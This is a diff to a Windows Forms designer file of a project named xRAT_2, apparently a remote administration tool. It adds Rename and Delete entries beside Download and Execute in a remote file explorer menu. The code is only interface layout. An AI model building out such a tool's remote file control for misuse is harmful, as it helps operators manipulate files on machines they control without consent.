@@ -34,7 +34,11 @@
             this.lblDrive = new System.Windows.Forms.Label();
             this.ctxtMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
             this.ctxtDownload = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtLine2 = new System.Windows.Forms.ToolStripSeparator();
             this.ctxtExecute = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtRename = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtDelete = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
             this.ctxtRefresh = new System.Windows.Forms.ToolStripMenuItem();
             this.imgListDirectory = new System.Windows.Forms.ImageList(this.components);
             this.botStrip = new System.Windows.Forms.StatusStrip();
@@ -43,7 +47,6 @@
             this.tabFileExplorer = new System.Windows.Forms.TabPage();
             this.tabTransfers = new System.Windows.Forms.TabPage();
             this.imgListTransfers = new System.Windows.Forms.ImageList(this.components);
-            this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
             this.lstDirectory = new xRAT_2.Controls.ListViewEx();
             this.hName = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hSize = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -81,11 +84,14 @@
             // 
             this.ctxtMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.ctxtDownload,
+            this.ctxtLine2,
             this.ctxtExecute,
+            this.ctxtRename,
+            this.ctxtDelete,
             this.ctxtLine,
             this.ctxtRefresh});
             this.ctxtMenu.Name = "ctxtMenu";
-            this.ctxtMenu.Size = new System.Drawing.Size(153, 98);
+            this.ctxtMenu.Size = new System.Drawing.Size(153, 148);
             // 
             // ctxtDownload
             // 
@@ -95,6 +101,11 @@
             this.ctxtDownload.Text = "Download";
             this.ctxtDownload.Click += new System.EventHandler(this.ctxtDownload_Click);
             // 
+            // ctxtLine2
+            // 
+            this.ctxtLine2.Name = "ctxtLine2";
+            this.ctxtLine2.Size = new System.Drawing.Size(149, 6);
+            // 
             // ctxtExecute
             // 
             this.ctxtExecute.Image = global::xRAT_2.Properties.Resources.run;
@@ -102,6 +113,27 @@
             this.ctxtExecute.Size = new System.Drawing.Size(152, 22);
             this.ctxtExecute.Text = "Execute";
             this.ctxtExecute.Click += new System.EventHandler(this.ctxtExecute_Click);
+            // 
+            // ctxtRename
+            // 
+            this.ctxtRename.Image = global::xRAT_2.Properties.Resources.textfield_rename;
+            this.ctxtRename.Name = "ctxtRename";
+            this.ctxtRename.Size = new System.Drawing.Size(152, 22);
+            this.ctxtRename.Text = "Rename";
+            this.ctxtRename.Click += new System.EventHandler(this.ctxtRename_Click);
+            // 
+            // ctxtDelete
+            // 
+            this.ctxtDelete.Image = global::xRAT_2.Properties.Resources.delete;
+            this.ctxtDelete.Name = "ctxtDelete";
+            this.ctxtDelete.Size = new System.Drawing.Size(152, 22);
+            this.ctxtDelete.Text = "Delete";
+            this.ctxtDelete.Click += new System.EventHandler(this.ctxtDelete_Click);
+            // 
+            // ctxtLine
+            // 
+            this.ctxtLine.Name = "ctxtLine";
+            this.ctxtLine.Size = new System.Drawing.Size(149, 6);
             // 
             // ctxtRefresh
             // 
@@ -187,11 +219,6 @@
             this.imgListTransfers.TransparentColor = System.Drawing.Color.Transparent;
             this.imgListTransfers.Images.SetKeyName(0, "cancel.png");
             this.imgListTransfers.Images.SetKeyName(1, "done.png");
-            // 
-            // ctxtLine
-            // 
-            this.ctxtLine.Name = "ctxtLine";
-            this.ctxtLine.Size = new System.Drawing.Size(149, 6);
             // 
             // lstDirectory
             // 
@@ -314,5 +341,8 @@
         private System.Windows.Forms.ToolStripMenuItem ctxtExecute;
         private System.Windows.Forms.ToolStripMenuItem ctxtRefresh;
         private System.Windows.Forms.ToolStripSeparator ctxtLine;
+        private System.Windows.Forms.ToolStripSeparator ctxtLine2;
+        private System.Windows.Forms.ToolStripMenuItem ctxtRename;
+        private System.Windows.Forms.ToolStripMenuItem ctxtDelete;
     }
 }
